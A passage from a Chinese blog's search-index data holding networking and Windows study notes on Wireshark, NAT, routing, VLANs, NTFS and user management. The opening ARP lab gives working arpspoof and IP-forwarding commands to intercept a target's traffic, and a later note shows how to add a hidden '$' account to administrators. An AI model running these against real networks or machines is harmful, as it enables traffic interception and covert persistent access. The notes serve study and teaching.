\n    - 伪造arp应答报文，向被攻击主机和通信响应真实的MAC地址\n  \n    - 当被攻击主机进行网络通信时，会将数据交给真实MAC地址（C），从而来截获被攻击主机的数据，被攻击主机可以进行网络通信\n  \n      ![image-20230320222126646](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320222126646.png)\n\n​\t\t\n\n- ARP-防御\n  - arp绑定\n\n- arp-实验\n\n  - 工具  arpspoof \n\n    ```powershell\n    apt-get install dsniff\n    ```\n\n  - 命令   \n\n    ```\n    sudo arpspoof -i eth0 -t 192.168.101.11 192.168.101.1\n    ```\n\n    向目标主机192.168.101.11 发送arp欺骗报文，使得192.168.101.1（网关），192.168.101.5（kali）的MAC地址都是攻击者的MAC地址，但是未开启转发，所以无法访问网络。\n\n    ![image-20230320225431939](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320225431939.png)\n\n![image-20230320225544395](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320225544395.png)\n\n![image-20230320225639735](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320225639735.png)\n\n- 开启转发\n\n  ```powershell\n  echo 1> /proc/sys/net/ipv4/ip_forward \n  ```\n\n  开启以后，网络恢复畅通，实现了arp 欺骗攻击。","tags":["网络安全"],"categories":["网络安全"]},{"title":"WireShark","url":"/2023/03/16/WireShark_new/","content":"\n\n协议\n\nTCP/IP 协议族\n\n- 网络接口层   PPPOE\n  - 物理层\n  - 数据链路层\n- 网络层：IP　ARP　RARP ICMP IGMP \n- 传输层  TCP(传输控制协议) UDP（用户数据包协议）\n- 应用层  HTTP FTP  DNS DHCP HTTPS SMTP  POP IMAP   0-65535   0-1023\n\n### WireShark  流量抓取工具\n\n一、网卡\n\n对主机网卡上的数据流量进行抓取\n\n1、网卡模式\n\n- 混杂模式  设置为混杂模式才可以抓取 \n- 非混杂模式（默认），不会接收目的非自己的数据\n\n2、界面认识\n\n3、过滤器\n\n- 捕获过滤器：抓包之前过滤，只抓某些类型如TCP\n\n  ![image-20230316224227676](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230316224227676.png)\n\n- 显示过滤器：抓取所有类型，查看时只显示特定类型\n\n![image-20230316224410232](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230316224410232.png)\n\n\n\n4 过滤器的语法\n\n- 捕获过滤器\n\n  - 类型：host net port \n\n  - 方向:src dst \n\n  - 协议: ether ip tcp udp http ftp dns\n\n  - 运算符: &&  ||  !  \n\n    示例 抓取源IP 为192.168.18.14 并且目标端口为80 的报文\n\n    ```powershell\n     src host  192.168.18.14 && dst port 80\n    ```\n\n    抓取IP 为192.168.18.1 或者192.168.18.14 的报文\n\n    ```powershell\n    host 192.168.18.14 || host 192.168.18.1\n    ```\n\n    非广播\n\n    ```powershell\n    ！broadcast\n    ```\n\n    抓取源IP 192.168.18.14 或者源IP 192.168.18.0 目的TCP端口 200-1000，位于129.0.0.0/8\n\n    ```powershell\n    (src ip  192.168.18.14 ||src net  192.168.18.0/24) && (dst portrange 200-1000 && dst net 129.0.0.0/8)\n    ```\n\n     \n\n- 显示过滤器\n  - 语法\n    - 比较的操作符： == (eq) != (neq) > (gt) < (lt) >= (ge)  <=(le)\n    - 逻辑操作符：  and &&  or || not \n    - IP 地址  ip.addr ip.src ip.dst\n    - 端口过滤  tcp.port udp.port tcp.dstport tcp.flag.syn \n    - 协议过滤： arp ip  icmp tcp udp\n  \n  - 示例：\n  \n    - 显示源IP是 192.168.18.14 并且tcp 端口是443\n  \n      ```powershell\n      ip.src==192.168.18.14&& tcp.port==443\n      ```\n  \n    - 显示源 不为192.168.18.14 或者目的不为202.98.96.68\n  \n      ```powershell\n      ip.src!=192.168.18.14 || ip.dst!=202.98.96.68\n      ```\n\n- 案例\n\n  查找www.jd.com 的dns解析以及http 通信报文\n\n![image-20230317223959377](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230317223959377.png)\n\n![image-20230317224016895](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230317224016895.png)\n\n![image-20230317224106101](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230317224106101.png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"NAT","url":"/2023/03/15/NAT_new/","content":"\n            \n一、NAT基本概念\n\n 将私网IP地址转换为公网IP地址 \n\n1、转换方式\n\n- 静态转换  仅针对IP地址转换 1对1\n\n  ```powershell\n  ip nat inside source static 192.168.1.1 64.23.12.34\t\n  ```\n\n  \n\n- 动态转换 仅针对IP地址转换 多对多(当内网主机多以外网IP个数时，无法实现内网所有主机上网 )，也无法根据外网地址定位内网，所以只能内网访问外网\n  ```powershell\n  #定义内网范围\n  access-list 1 permit 192.168.10.0 0.0.0.255\n  \n  #定义外网范围\n  ip nat pool woniu 23.24.56.60 23.24.56.61 netmask 255.255.255.0\n  #应用\n  ip nat inside source list 1 pool woniu\n  ```\n\n  \n\n- 端口多路复用PAT 多对1转，携带端口一起转换  192.168.1.1：8899 ---》1.2.3.4：12345，形成的也是动态对应关系，只能内网访问外网\n\n  - 端口多路复用\n\n    - 内网的多个地址转换为外网的一个IP地址（端口一起转换）\n\n      ```powershell\n      #定义内网范围\n      access-list 1 permit any\n      \n      #定义外网范围\n      ip nat pool woniu 23.24.56.60 23.24.56.60 netmask 255.255.255.0\n      #应用\n      ip nat inside source list 1 pool woniu overload\n      ```\n\n      \n\n    - 内网多个地址直接转换为外网接口的地址\n\n      ```powershell\n      #定义内网范围\n      access-list 1 permit any\n      \n      #应用\n      ip nat inside source list 1 int g0/1 overload\n      ```\n\n      \n\n- 端口映射(服务器映射)  -  只能外网访问内网\n\n  - 将一台内网的服务器发布到内网，从而使内网的主机可以访问到内网的服务器\n\n  - 192.168.1.1：80 -》54.234.123.55：80\n\n    ```powershell\n    ip nat inside source static tcp 192,168.1.100 80 23.34.56.78 8888\n    ```\n\n    \n\n​\t\t\t\t","tags":["网络安全"],"categories":["网络安全"]},{"title":"动态路由协议","url":"/2023/03/11/动态路由协议_new/","content":"\n            \n## 动态路由协议\n\n- 动态路由协议\n\n  - RIP：路由信息协议，距离矢量路由协议\n\n  - OSPF：开放式最短路径优先\n\n  - BGP：外部网关路由协议\n\n- 特点\n\n  - 减少管理员的工作量\n\n  - 增加了网络带宽\n\n- 什么是内部，什么是外部\n  - AS：运行相同的路由协议的路由器属于同一个自治系统\n  - 通过自治系统连接外部的路由器，需要经过外部网关\n  - 内部网关路由协议（IGP）：用于在单一自治系统中去决策路由，RIP，OSPF\n  - 外部网关路由协议：用于连接不同自治系统，BGP\n\n![image-20230311225105486](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230311225105486.png)\n\n- 动态路由协议需要考虑的内容\n  - 度量值：跳数、带宽、时延、成本\n  - 收敛：所有路由器的路由表达到一致的状态\n\n- RIP协议\n\n  - 基本概念\n\n    - 一种内部网关协议，在单一自治系统内的路由器去传递路由信息\n    - 靠跳数来衡量到达目标的距离\n      - 最大15跳，16代表不可达\n\n    - 每隔30秒向相邻的路由器发送路由更新消息，采用UDP 520端口\n    - 从相邻的路由器去学习路由条目\n\n![image-20230311230625611](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230311230625611.png)\n\n不同颜色代表不同周期，C代表直连，R代表路由器，第二列代表网段，第三列代表端口号，第四列代表距离\n\n\n\n- OSPF 动态路由协议\n\n  - 概念\n\n    - 开放式最短路径优先路由协议，内部网关路由协议\n\n    - 链路状态路由协议：在单一区域内的路由器可以向相邻路由器发送链路状态信息\n\n    - 工作过程\n\n      - 相邻的路由器建立邻接关系\n\n      - 根据链路信息，建立链路状态数据库\n      - 最短路径树计算\n      - 路由表\n\n  - OSPF区域\n\n    - 划分区域\n      - 适应大型网络\n      - 每个ospf 路由器只维护自己所在区域的链路状态信息\n      - 每个区域有一个区域ID，用十进制或者IP地址表示\n      - 骨干区域：区域之间的路由信息传播\n        - 区域ID：0，0.0.0.0\n      - 非骨干区域：普通区域\n\n    - 单区域内容\n\n      - 在同一个区域当中通过选举DR和BDR来节省网络中的流量\n\n        区域中的其他路由器只会和DR和BDR建立邻接关系  \n\n      - DR 选举\n        - 通过routeID进行选举，最大的作为DR，第二大作为 BDR\n    \n    - 度量值\n      - cost值（代价）\n    \n    - 邻接关系建立\n    \n      - 以组播方式发送\n        - 224.0.0.5 代表所有OSPF\n        - 224.0.0.6 代表DR BDR\n    \n      - 报文类型\n        - hello保温\n        - 数据库描述包\n        - 链路状态请求包\n        - 链路状态更新包\n        - 链路状态确认包\n\n- RIP 和OSPF对比\n\n  - RIP１　不支持可变长子网掩码，使用广播更新\n\n  - RIP 2 使用组播更新\n\n  - 跳数限制15跳\n\n  - 不能划分区域，网络收敛慢\n\n    \n\n  - OSPF 使用组播更新\n\n  - 网络收敛快，通过区域划分\n\n  - 支持可变长子网掩码，携带子网掩码\n\n- ospf 配置\n\n  ```\n  route ospf 10\n  netword 192.168.10.0 0.0.0.255 area 0\n  192.168.10.0 宣告的网段 0.0.0.255 反码  area 表示宣告的区域\n  show ip ospf  查看ospf 基本配置信息\n  show ip ospf neighbor  查看邻接关系\n  ```\n\n- ospf 多区域概念\n\n  - 目的  实现大型网络环境，实现单区域网络快速收敛，改善网络，减小路由表\n  \n  - 通信\n    - 域内通信量\n    - 域外通信量- ABR\n    - 外部通信量-与其他自治系统  ASBR\n  \n  - 区域\n    - 骨干区域\n    - 非骨干区域\n      - 标准区域\n      - 末梢区域\n      - 完全末梢\n      - 非纯末梢\n  \n  - OSPF 高级配置\n  \n    - 路由重分发\n  \n      在大型网络中，可能在同一网络中用到多种路由协议，为了协同工作，路由器通过路由重分发将其学习到的一种路由协议的路由通过另一种路由协议广播出去。\n  \n    - NSSA\n  \n      非纯末梢区域，在此区域内会有一个ASBR路由器，需要在ASBR上配置重分发\n    \n      - 多了一种类型LSA，类型7LSA在一个  NSSA区域内携带外部信息\n      - 在NSSA的ABR上转换位5LSA \n      - N1 N2类型\n      - 通过NSSA的ABR之后转换为E1、E2  \n    \n    - 虚链路\n    \n      - 在两台ABR之间建立，穿越一个非骨干区域 \n","tags":["网络安全"],"categories":["网络安全"]},{"title":"热备份路由选择协议","url":"/2023/03/10/热备份路由选择协议_new/","content":"\n            \n## HSRP（热备份路由选择协议）\n\n### 目标\n\n1、了解HSRP的相关概念\n\n2、理解工作原理\n\n3、配置\n\n#### 一、概念\n\n1、成员\n\n- 活跃路由器\n- 备份路由器\n- 虚拟路由器\n- 其他路由器\n\n2、虚拟MAC地址\n\n- ４８位包括前２４　厂商编码，后２４位序列号\n- 后24位包括固定值07AC+HSRP组号\n\n3、HSRP 消息\n\n- UDP协议，端口号1985\n- 组播模式 224.0.0.2\n- 生命周期 TTL=1\n\n#### 二、工作原理\n\n如下，主机要访问外网，将数据交给自己的网关，在这里主机配置的网关是HSRP组中的虚拟路由器，虚拟路由器收到数据后，根据HSRP组中的机制，将数据交给活跃的路由器进行转发，活跃路路由器根据自身路由表进行转发数据。\n\n\n\n![image-20230310234009478](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230310234009478.png)\n\n- 设置组号（决定虚拟路由器的MAC地址）\n- 优先级\n- 占先\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"路由器相关知识","url":"/2023/03/09/路由器相关知识_new/","content":"\n            \n1、路由器相关知识\n\n- 三层设备\n- 网络层功能\n  - 逻辑地址寻址，实现不同网络直接的路径选择\n  - 查找目的是否可达，可达则选择最优路径\n\n- 网络层传输的是PDU ,IP数据包\n\n2、IP数据包的格式\n\n- IPV4 数据包格式 \n\n  ![image-20230309102043979](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230309102043979.png)\n\n3、路由器的工作原理\n\n- 路由\n  - 从源主机到目标主机的转发过程\n  - 包含两个内容\n    - 确定最佳路径（手动绑定，根据动态路由协商方式）\n    - 通过网络传输信息\n\n- 路由表\n  - 直接路由：当路由器的接口配置好对应的IP地址并开启接口后自动生成 \n  - 非直接路由：需要手动配置静态路由或者使用动态路由协议学习\n\n4、静态路由\n\n- 管理员配置、不灵活\n\n- 特殊的静态路由：默认路由\n\n  - 使用场景：一般应用于末节网络\n\n  ```powershell\n  ip route 目标网络 下一跳地址或者接口\n  ip route 192.168.10.0 255.255.255.0 192.168.30.2\n  ip route 192.168.10.0 255.255.255.0 f0/1\n  ```\n\n  \n\n5、动态路由\n\n- 通过某种动态路由协议自动的去建立自己的路由表\n- 常见的动态路由协议，RIP OSPF\n\n6、路由器转发数据\n\n源IP和目的IP一直不发生变化，源MAC地址和目的MAC地址一直在发生变化，路由器不断进行2层封装\n\n同网段传输主要是二层转发，不需要重新封装\n\n跨网段传输主要是三层转发，需要重新封装\n\n7、 VLAN\n\n把同一个网段的主机划分到不同的广播域，不能再简单的进行二层通信了，在同一交换机下，不同vlan不能直接通信了\n\n- 划分的目的\n\n  - 划分广播域\n\n  - 增强安全性\n\n  - 简化管理\n\n- 种类\n\n  - 静态划分\n\n    基于端口进行划分，需要去配置\n\n    华为路由器 1-4094 端口范围\n\n  - 动态划分\n\n    基于MAC地址自动加入\n\n- VLUN TRUNK\n  - 实现相同VLAN跨交换机通信\n  - 配置接口模式为Trunk模式\n\n\n\n8、不同VLAN直接的通信技术\n\n- 单臂路由(路由器压力大，容易造成网络拥堵)\n  - 在路由器上划分子接口作为不同vlan的网关,例如g/0 物理接口划分为g/0.1 g/0.2\n  - 主机与交换机-access\n  - 交换机和路由器--Trunk\n- 三层交换 ","tags":["网络安全"],"categories":["网络安全"]},{"title":"交换机的工作原理","url":"/2023/03/08/交换机的工作原理_new/","content":"\n\n\n\n1、数据链路层设备，传输数据帧，封装MAC头部，源MAC地址，目的MAC地址\n\n2、数据链路层的功能\n\n- 建立逻辑连接，进行物理地址寻址，差错校验\n- 数据链路的建立，维护和拆除\n- 数据帧的封装、传输、同步、差错校验、流量控制\n\n3、以太网\n\n  以太网== 局域网\n\n- 有线局域网\n- 无线局域网\n\n4、交换机==默认以太网交换机\n\n5、MAC地址\n\n- 用于标识以太网商的某个设备\n- 以太网中通信需要MAC地址\n\n6、以太网的帧格式\n\n![image-20230308233126335](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230308233126335.png)\n\n7、以太网交换机\n\n- 早期共享式交换机-集线器\n  - 一个冲突域的网络\n- 交换式网络\n  - 广播\n  - 数据转发流程，A往B转发，交换机接受到A发来的数据帧后会检查MAC表中是否存在端口和MAC地址的对应关系，没有则不补上，随后查看目的MAC地址，如果不存在则广播，B收到后回应，其他的收到后丢弃，随后以单播方式通信。 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"NTFS 权限规则","url":"/2023/03/04/NTFS 权限规则_new/","content":"\n            \nNTFS 权限规则\n\n一、权限规则\n\n1. 权限的累加\n\n   - 用户分配的有效权限是分配给用户所有权限的累加\n\n     用户被分配的权限+所属组的权限\n\n2. 拒绝权限\n\n   - 拒绝的权限大于一切（在访问控制列表中，权限最高）\n   - 出现权限冲突时，拒绝的权限优先级最高（用户所属组读取权限，用户拒绝读取，最终是拒绝读取权限）\n\n3. 继承权限\n\n   - 文件或者文件夹默认集成上级文件夹的权限\n\n4. 特殊权限\n\n   - 读取权限（和读取文件或者文件夹的内容无关）\n\n     - 读取文件或者文件夹的访问控制列表  ，没有读取权限，点击文件-属性-安全，看不到ACL\n     - 访问文件的内容，此权限必须勾选\n\n   - 更改权限（和修改文件、修改文件夹的内容无关）\n\n     - 用户是否可以修改文件或者文件夹的访问控制列表，此权限可以为用户添加或者删除权限，会造成很多不安全因素，一般不给用户\n     - 更改的前提是读取权限\n\n   - 取得所有权\n\n     - 能够修改文件或者文件夹的所有者\n\n     - 前提是读取和更改","tags":["网络安全"],"categories":["网络安全"]},{"title":"NTFS权限","url":"/2023/03/04/NTFS权限_new/","content":"\n\nNTFS权限\n\n一、 NTFS权限\n\n1. 文件系统\n\n   - windows\n\n     - 早期windows使用FAT16，FAT32\n     - NTFS\n       - ACL（访问控制列表）\n       - EFS(加密文件系统) BitLocker\n       - 压缩及磁盘配额\n\n     - ReFS  winserver2012\n\n   - Linux\n\n     - swap:交换文件系统，主要将磁盘的一部分空间划分给内存使用\n     - ext3/ext4\n\n   可以用convert命令在不格式化的前提下，修改文件系统\n\n   ```\n   convert H:/fs:ntfs   //H 是盘符\n   ```\n\n   \n\n二、文件权限\n\n设置文件权限\n- 读取数据\n- 写入数据\n- 附加数据\n- 删除\n- 执行\n\n三、文件夹权限\n\n1. 设置文件夹权限\n\n- 列出文件夹\n- 创建文佳佳\n- 创建文件\n- 删除\n- 删除子文件夹和文件\n\n四、权限的分类\n\n- 完全控制\n- 修改\n- 读取和执行\n- 读取\n- 写入\n- 特殊权限   -读取权限 更改权限  取得所有权","tags":["网络安全"],"categories":["网络安全"]},{"title":"windows 文件共享","url":"/2023/03/04/windows 文件共享_new/","content":"\n            \nwindows 文件共享\n\n一、共享要求\n\n一般是局域网使用\n\n1、物理上处于同一局域网\n\n- 同一公司的网络\n- 同一家庭的网络\n- 同一个手机热点\n\n2、逻辑上处于同一局域网\n\n- 直接可以ping 对方主机\n\n二、共享权限\n\n1、共享权限\n\n- everyone完全控制\n\n2、NTFS权限\n\n- 根据用户来的\n\n3、用户从网络访问server的最终权限\n\n- 共享权限和NTFS权限的交集\n\n三、访问共享\n\n```powershell\n\\\\server_address\n\\\\主机名\n```\n\n- 输入用户名和密码\n\n  ","tags":["网络安全"],"categories":["网络安全"]},{"title":"windows 用户管理","url":"/2023/03/04/windows 用户管理_new/","content":"\n            \nwindows 用户管理\n\n一. 用户账户\n\n1. 什么是用户账户\n\n   - 不同的用户身份拥有不同的权限\n\n   - 每个用户包含了一个名称和密码\n\n   - 每个用户账户具有唯一的安全标识符号 SID\n\n   - 查看系统中的用户\n\n     ```powershell\n     net user\n     ```\n\n   - 查看SID\n\n     - 命令查看\n\n     ```powershell\n     whoami /user\n     wmic useraccount get name,sid\n     ```\n\n     - 注册表查看SID\n\n       计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\\n\n2. 进行用户管理\n\n   - 创建用户\n\n     - 用户名：系统的显示名\n\n     - 全名：用户登录时的显示名\n\n     - 密码：server版本有密码复杂性要求，本地安全策略\n\n     - 账户已锁定：如果开启账户锁定阈值，账户有可能输错多次被锁定\n\n       ```\n       # 创建用户不指定密码\n       net user 用户名 /add\n       # 创建用户指定明文密码\n       net user 用户名 密码 /add\n       # 创建用户，手动输入密码\n       net user 用户名 /add *\n       ```\n\n   - 管理用户\n\n   - 设置密码\n\n   - 隐藏用户\n\n     ```powershell\n     # net user 查看不到 wmic useraccount get name,sid ,以及计算机管理里面可以看到\n     net user 用户名$ 密码 /add\n     ```\n\n     ```powershell\n     # 添加隐藏用户并提升为管理员权限\n     net localgroup administrators 用户名 /add\n     ```\n\n   二 、windows的内置用户\n\n   1、与使用者关联的\n\n   - 管理员：administrator使用者中具有最高的权限,没有其他管理员的情况下，不建议禁用\n   - 普通用户：具有一定的读取权限，权限较低\n   - 来宾用户：提供给访客使用，默认为禁用，权限最低\n\n   2、与windows 组件相关\n\n   - system 本地系统：拥有最高权限\n   - local service 本地服务  :权限相对于普通用户组user 低一些\n   - netword service 网络服务：权限跟普通用户组user 一样","tags":["网络安全"],"categories":["网络安全"]},{"title":"windows 组的管理","url":"/2023/03/04/windows 组的管理_new/","content":"\n            \nwindows 组的管理\n\n一、用户组\n\n 1. 概念\n\n    一组用户的集合，组中所有的用户具备组的权限\n\n 2. 管理组\n\n    ```powershell\n    # 新建组\n    net localgroup 组名 /add\n    # 删除组\n    net localgroup 组名 /del\n    # 添加成员到组\n    net localgroup 组名 成员 /add\n    # 把用户从组里删除\n    net localgroup 组名 成员 /del\n    ```\n\n二、内置组用户\n\n   \t1. 需要认为添加的\n       - administrators:管理员组\n       - guests:来宾用户组\n       - power users:向下兼容的组\n       - users:标准用户组，创建用户后默认属于该组\n   \t2. 动态包含成员\n       - interactive:动态包含在本地登录的用户\n       - authenticated users:动态包含通过验证的用户\n       - everyone:所有人，包含了来宾用户","tags":["网络安全"],"categories":["网络安全"]},{"title":"本地安全策略大纲","url":"/2023/03/04/本地安全策略_new/","content":"\n\n本地安全策略大纲\n\n一、本地安全策略基本内容\n\n1、概念\n\n- 主要对登录到计算机的账户进行一些安全设置\n- 主要是影响本地计算机的安全\n\n2、打开方式\n\n- 开始菜单-管理工具-本地安全策略\n\n- 使用命令\n\n  ```powershell\n  secpol.msc\t\n  ```\n\n- 从本地组策略进去\n\n  ```powershell\n  gpedit.msc\n  ```\n\n二、账户策略\n\n1、密码策略\n\n- 密码必须符合复杂性要求\n\n2、账户锁定策略\n\n- 账户锁定时间\n- 账户锁定阈值\n- 重置账户锁定计数器的时间\n- 管理员不受限制----注册表隐藏管理员账户，从而无法实施爆破\n\n三、本地策略\n\n- 审核策略\n- 用户权限分配\n- 安全选项\n\n  ","tags":["网络安全"],"categories":["网络安全"]},{"title":"注册表相关修改小技巧","url":"/2023/03/04/注册表相关修改小技巧/","content":"\n\n\n\n1、去除快捷方式左下角的小箭头\n\nHKEY—CLASS_ROOT\\lnkfile  Isshortcut 删除\n\n2、禁用注册表\n\nHKCU\\software\\microsoft\\windows\\currentversion\\policies\\system [DisableRegistrytools]:1\n\n3、禁用状态下，如何恢复\n\nRegistry WorkShop 来打开，改写禁用注册表的项\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"计算机网络五层协议","url":"/2023/03/04/计算机网络五层协议/","content":"\n\n\n应用层： 将原始数据转换为计算机的二进制，HTTP，FTP，SMTP\n\n传输层：将报文划分成较小的块，然后为每块加上传输层首部来生成传输层报文段。代表是TCP，UDP协议\n\n网络层：进行逻辑地址寻址，进行IP头部的封装，主要的字段，源IP和目的IP。\n\n数据链路层：建立逻辑链接，进行物理地址寻址，主要的字段源MAC地址，目的MAC地址\n\n物理层：将二进制数据转换为电信号通过网卡通过网线进行传输。\n\n\n\n![img](https://iknow-pic.cdn.bcebos.com/359b033b5bb5c9ea4701c08fda39b6003bf3b3e8)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"IDA创建结构体","url":"/2018/04/12/IDA创建结构体/","content":"\n1.在IDA中打开Structures，快捷键是shifr+ F9 ,然后按insert键，进行插入\n\n![5ad5559c1b1dc](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/5ad5559c1b1dc.png)\n\n 2.在ends 后按d键，添加相应的成员，然后选中成员名，按N进行修改，选中类型，按d 进行更改类型，构造完结构题以后，回到代码窗口\n\n![5ad555a742e37](https://i.loli.net/2018/04/17/5ad555a742e37.png)\n\n  3  在代码窗口找到相应的变量，右键选择Convert to struct ，然后选择刚刚你定义的结构体即可。\n\n","tags":["逆向"],"categories":["逆向"]},{"title":"PE Checksum","url":"/2018/04/12/PE Checksum/","content":"\n### 1.check 介绍\n\nPE文件可选头结构如下，其中有个成员是checksum ，其在编译以后生成一个校验和，\n所有驱动、系统启动时加载的DLL、系统关键进程加载的DLL都要进行校验和的校验，查看是否有改动，这个检验和可以通过API进行计算，CheckSumMappedFile 或者直接 MapFileAndCheckSum，计算算法比较简单如下：\n\n* 因为要计算整个文件数据嘛，所以开始这个字段的数据要先置0；\n* 从文件头开始，每次读一个字（WORD），进行带进位的累加（ADC），超出WORD部分自动溢出；\n* 将前面的累加和再加上PE文件的长度，结果就是这个校验和了\n\n### 2 测试代码如下：\n\n\t#include\"stdafx.h\"\n\t#include <windows.h>\n\t#include<ImageHlp.h>\n\t#pragma comment(lib,\"ImageHlp.lib\")\n\n\n​\t\n\n\tvoid main()\n\t{\n\t\tDWORD HeaderCheckSum = 0;   //PE头里的校验值\n\t\tDWORD CheckSum = 0;     //计算下来的校验值\n\t\tMapFileAndCheckSum(L\"D:\\\\newupdate.exe\", &HeaderCheckSum, &CheckSum);\n\t\n\t\tif (CheckSum == HeaderCheckSum)\n\t\t{\n\t\t\tMessageBox(NULL, L\"相等\", NULL, 0);\n\t\t}\n\t\n\t}\n\n\n### 附PE可选头结构\n\ntypedef struct _IMAGE_OPTIONAL_HEADER \n{\n    //\n    // Standard fields.  \n    //\n+18h    WORD    Magic;         // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）\n+1Ah    BYTE      MajorLinkerVersion;     // 链接程序的主版本号\n+1Bh    BYTE      MinorLinkerVersion;     // 链接程序的次版本号\n+1Ch    DWORD   SizeOfCode;     // 所有含代码的节的总大小\n+20h    DWORD   SizeOfInitializedData;    // 所有含已初始化数据的节的总大小\n+24h    DWORD   SizeOfUninitializedData; // 所有含未初始化数据的节的大小\n+28h    DWORD   AddressOfEntryPoint;    // 程序执行入口RVA\n+2Ch    DWORD   BaseOfCode;      // 代码的区块的起始RVA\n+30h    DWORD   BaseOfData;      // 数据的区块的起始RVA\n    //\n    // NT additional fields.    以下是属于NT结构增加的领域。\n    //\n+34h    DWORD   ImageBase;      // 程序的首选装载地址\n+38h    DWORD   SectionAlignment;      // 内存中的区块的对齐大小\n+3Ch    DWORD   FileAlignment;      // 文件中的区块的对齐大小\n+40h    WORD    MajorOperatingSystemVersion;  // 要求操作系统最低版本号的主版本号\n+42h    WORD    MinorOperatingSystemVersion;  // 要求操作系统最低版本号的副版本号\n+44h    WORD    MajorImageVersion;       // 可运行于操作系统的主版本号\n+46h    WORD    MinorImageVersion;       // 可运行于操作系统的次版本号\n+48h    WORD    MajorSubsystemVersion;  // 要求最低子系统版本的主版本号\n+4Ah    WORD    MinorSubsystemVersion;  // 要求最低子系统版本的次版本号\n+4Ch    DWORD   Win32VersionValue;       // 莫须有字段，不被病毒利用的话一般为0\n+50h    DWORD   SizeOfImage;       // 映像装入内存后的总尺寸\n+54h    DWORD   SizeOfHeaders;       // 所有头 + 区块表的尺寸大小\n+58h    DWORD   CheckSum;       // 映像的校检和\n+5Ch    WORD    Subsystem;       // 可执行文件期望的子系统\n+5Eh    WORD    DllCharacteristics;       // DllMain()函数何时被调用，默认为 0\n+60h    DWORD   SizeOfStackReserve;       // 初始化时的栈大小\n+64h    DWORD   SizeOfStackCommit;       // 初始化时实际提交的栈大小\n+68h    DWORD   SizeOfHeapReserve;        // 初始化时保留的堆大小\n+6Ch    DWORD   SizeOfHeapCommit;        // 初始化时实际提交的堆大小\n+70h    DWORD   LoaderFlags;        // 与调试有关，默认为 0 \n+74h    DWORD   NumberOfRvaAndSizes;  // 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16\n+78h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];\n       // 数据目录表\n} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;\n","tags":["逆向"],"categories":["逆向"]},{"title":"ubuntu 无法安装软件","url":"/2018/04/12/ubuntu 无法安装软件/","content":"\n### 问题描述  \napt-get install package 时出现以下问题\n\nE: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)\nE: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?\n\n\n### 解决办法： \n sudo rm /var/lib/dpkg/lock\n sudo dpkg --configure -a","tags":["杂学"],"categories":["杂学"]},{"title":"windows 更新以后无法定位msvcp_win.dll","url":"/2018/04/12/windows 更新以后无法定位msvcp_win.dll/","content":"\n### 问题描述：\n\nwin10更新以后出现 无法定位程序输入点_uncaught_exceptions 于动态链接库 C:\\windows\\system32\\msvcp_win.dll上。\n\n### 解决办法：\n\n命令行下：输入sfc /scannow\n\n","tags":["杂学"],"categories":["杂学"]},{"title":"windows 编程获取网卡和ip","url":"/2018/04/12/windows 编程获取网卡和ip/","content":"\n一台机器上可能不只有一个网卡，但每一个网卡只有一个MAC地址，而每一个网卡可能配置有多个IP地址；如平常的笔记本电脑中，就会有无线网卡和有线网卡（网线接口）两种；因此，如果要获得本机所有网卡的IP和MAC地址信息，则必须顺序获得每个网卡，再依次获取其信息等；在windows sdk中，用IP\\_ADAPTER\\_INFO结构体存储网卡信息，包括网卡名、网卡描述、网卡MAC地址、网卡IP等，该结构体的主要描述如下所示：\n\n    \t\t\ttypedef struct _IP_ADAPTER_INFO {\n    \t\t\tstruct _IP_ADAPTER_INFO* Next;//指向链表中下一个适配器信息的指针\n    \t\t\tDWORD ComboIndex;//预留值\n    \t\t\tchar AdapterName[MAX_ADAPTER_NAME_LENGTH + 4];//使用ANSI字符串表示的适配器名称\n    \t\t\tchar Description[MAX_ADAPTER_DESCRIPTION_LENGTH + 4];//使用ANSI字符串表示的适配器描述\n    \t\t\tUINT AddressLength;//适配器硬件地址以字节计算的长度\n    \t\t\tBYTE Address[MAX_ADAPTER_ADDRESS_LENGTH];//硬件地址以BYTE数组所表示\n    \t\t\tDWORD Index;//适配器索引\n    \t\t\t\t\tUINT Type;//适配器类型,主要有以下几种：\n    \t\t\t\t\t/*\n    \t\t\t\t\t*   MIB_IF_TYPE_OTHER     1\n    \t\t\t\t\t*   MIB_IF_TYPE_ETHERNET     6\n    \t\t\t\t\t*   MIB_IF_TYPE_TOKENRING     9\n    \t\t\t\t\t*   MIB_IF_TYPE_FDDI     15\n    \t\t\t\t\t*   MIB_IF_TYPE_PPP     23\n    \t\t\t\t\t*   MIB_IF_TYPE_LOOPBACK      24\n    \t\t\t\t\t*   MIB_IF_TYPE_SLIP      28\n    \t\t\t\t\t*/\n    \t\t\tUINT DhcpEnabled;//指定这个适配器是否开启DHCP\n    \t\t\tPIP_ADDR_STRING CurrentIpAddress;//预留值\n    \t\t\tIP_ADDR_STRING 